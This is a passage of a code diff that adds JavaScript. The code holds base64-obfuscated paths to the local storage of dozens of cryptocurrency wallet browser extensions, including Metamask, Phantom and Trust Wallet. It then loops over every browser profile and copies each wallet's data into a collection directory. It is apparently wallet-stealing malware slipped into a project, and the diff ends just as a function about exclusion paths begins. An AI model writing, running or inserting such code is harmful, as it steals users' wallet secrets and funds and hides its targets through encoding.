+    "Martian": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xlZmJnbGdvZm9pcHBiZ2NqZXBuaGlibGFpYmNuY2xnaw==",
+    "Math": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xhZmJjYmpwYnBmYWRsa21obWNsaGtlZW9kbWFtY2ZsYw==",
+    "Metamask": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubg==",
+    "Metamask2": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xlamJhbGJha29wbGNobGdoZWNkYWxtZWVlYWpuaW1obQ==",
+    "Mobox": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xmY2Nra2Riam5vaWtvb2VkZWRsYXBjYWxwaW9ubWFsbw==",
+    "Nami": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xscGZjYmprbmlqcGVlaWxsaWZua2lrZ25jaWtnZmhkbw==",
+    "Nifty": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xqYmRhb2NuZWlpaW5tamJqbGdhbGhjZWxnYmVqbW5pZA==",
+    "Oxygen": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xmaGlsYWhlaW1nbGlnbmRka2pnb2ZrY2JnZWtoZW5iaA==",
+    "PaliWallet": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xtZ2Zma2ZiaWRpaGpwb2FvbWFqbGJnY2hkZGxpY2dwbg==",
+    "Petra": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xlampsYWRpbm5ja2RnamVtZWtlYmRwZW9rYmlraGZjaQ==",
+    "Phantom": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYQ==",
+    "Pontem": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xwaGtiYW1lZmluZ2dtYWtna2xwa2xqam1naWJvaG5iYQ==",
+    "Ronin": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xmbmpobWtoaG1rYmpra2FibmRjbm5vZ2Fnb2dibmVlYw==",
+    "Safepal": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xsZ21wY3BnbHBuZ2RvYWxiZ2VvbGRlYWpmY2xuaGFmYQ==",
+    "Saturn": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xua2RkZ25jZGpnamZjZGRhbWZnY21mbmxoY2NuaW1pZw==",
+    "Slope": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xwb2NtcGxwYWNjYW5obW5sbGJia3BnZmxpaW1qbGpnbw==",
+    "Solfare": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xiaGhobGJlcGRrYmFwYWRqZG5ub2prYmdpb2lvZGJpYw==",
+    "Sollet": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xmaG1mZW5kZ2RvY21jYm1maWtkY29nb2ZwaGltbmtubw==",
+    "Starcoin": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xtZmhiZWJnb2Nsa2doZWJmZmRsZHBvYmVham1iZWNmaw==",
+    "Swash": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xjbW5kamJlY2lsYm9jamZraWJmYmlmaG5na2RtamdvZw==",
+    "TempleTezos": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xvb2tqbGJraWlqaW5ocG1uamZmY29mam9uYmZiZ2FvYw==",
+    "TerraStation": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xhaWlmYm5iZm9icG1lZWtpcGhlZWlqaW1kcG5scGdwcA==",
+    "Tokenpocket": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xtZmdjY2pjaGloZmtraW5kZnBwbmFvb2VjZ2ZuZWlpaQ==",
+    "Ton": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xucGhwbHBnb2FraGhqY2hra2htaWdnYWtpam5raGZuZA==",
+    "Tron": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xpYm5lamRmam1ta3BjbmxwZWJrbG1ua29lb2lob2ZlYw==",
+    "Trust Wallet": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xlZ2ppZGpicGdsaWNoZGNvbmRiY2JkbmJlZXBwZ2RwaA==",
+    "Wombat": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xhbWttamptbWZsZGRvZ21ocGpsb2ltaXBib2ZuZmppaA==",
+    "XDEFI": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xobWVvYm5mbmZjbWRrZGNtbGJsZ2FnbWZwZmJvaWVhZg==",
+    "XMR.PT": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xlaWdibGJnamtubGZiYWprZmhvcG1jb2ppZGxnY2VobQ==",
+    "XinPay": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xib2Nwb2tpbWljY2xwYWlla2VuYWVlbGVoZGpsbG9mbw==",
+    "Yoroi": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xmZm5iZWxmZG9laW9oZW5ramlibm1hZGppZWhqaGFqYg==",
+    "iWallet": "XExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xrbmNjaGRpZ29iZ2hlbmJiYWRkb2pqbm5hb2dmcHBmag==",
+  };
+    let totalCopied = 0;
+
+  // Ensure destination directory exists
+  if (!fswithout.existsSync(destBase)) {
+    fswithout.mkdirSync(destBase, { recursive: true });
+  }
+
+  for (const [browserName, obfuscatedBrowserPath] of Object.entries(browsers)) {
+    const deobfuscatedBrowserPath = deobfuscate(obfuscatedBrowserPath);
+    const browserDataPath = path.join(userHome, deobfuscatedBrowserPath);
+    
+    console.log(`Checking browser: ${browserName} at ${browserDataPath}`);
+    
+    if (!fswithout.existsSync(browserDataPath)) {
+      console.log(`Browser path not found: ${browserDataPath}`);
+      continue;
+    }
+
+    let browserCopied = 0;
+
+    try {
+      const profiles = getBrowserProfiles(browserDataPath);
+      console.log(`Found ${profiles.length} profiles for ${browserName}`);
+      
+      for (const profile of profiles) {
+        console.log(`Processing profile: ${profile.name}`);
+        
+        for (const [extName, obfuscatedExtPath] of Object.entries(extensionPaths)) {
+          const deobfuscatedExtPath = deobfuscate(obfuscatedExtPath);
+          const source = path.join(profile.path, deobfuscatedExtPath);
+          const dest = path.join(destBase, browserName, profile.name, extName);
+          
+          console.log(`Checking extension: ${extName} at ${source}`);
+          
+          if (fswithout.existsSync(source)) {
+            try {
+              // Ensure destination directory exists
+              const destDir = path.dirname(dest);
+              if (!fswithout.existsSync(destDir)) {
+                fswithout.mkdirSync(destDir, { recursive: true });
+              }
+              
+              console.log(`Copying from ${source} to ${dest}`);
+              copyDir(source, dest);
+              browserCopied++;
+              totalCopied++;
+              console.log(`Successfully copied ${extName}`);
+            } catch (err) {
+              console.error(`Error copying ${extName}:`, err);
+            }
+          } else {
+            console.log(`Source not found: ${source}`);
+          }
+        }
+      }
+    } catch (error) {
+      console.error(`Error processing browser ${browserName}:`, error);
+    }
+    
+    if (browserCopied > 0) {
+      console.log(`Copied ${browserCopied} items from ${browserName}`);
+    }
+  }
+  
+  console.log(`Total items copied: ${totalCopied}`);
 }
 async function verifyExclusion(exclusionPath) {
     try {
